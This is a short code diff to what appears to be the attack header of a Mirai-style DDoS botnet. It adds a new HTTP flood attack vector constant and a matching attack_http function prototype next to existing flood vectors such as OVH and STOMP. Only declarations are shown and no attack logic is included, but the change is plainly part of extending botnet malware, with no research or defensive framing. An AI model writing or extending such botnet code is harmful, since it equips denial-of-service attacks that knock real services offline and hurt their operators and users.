@@ -55,6 +55,7 @@ struct Attack {
 #define ATK_VEC_TCPWRA      10
 #define ATK_VEC_OVH         11
 #define ATK_VEC_STOMP       12
+#define ATK_VEC_HTTP      13
 
 
 #define ATK_OPT_PAYLOAD_SIZE    0   // What should the size of the packet data be?
@@ -114,6 +115,7 @@ void attack_tcpstream(uint8_t, struct attack_target *, uint8_t, struct attack_op
 void attack_wraflood(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_ovh(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void update_process(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
 static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
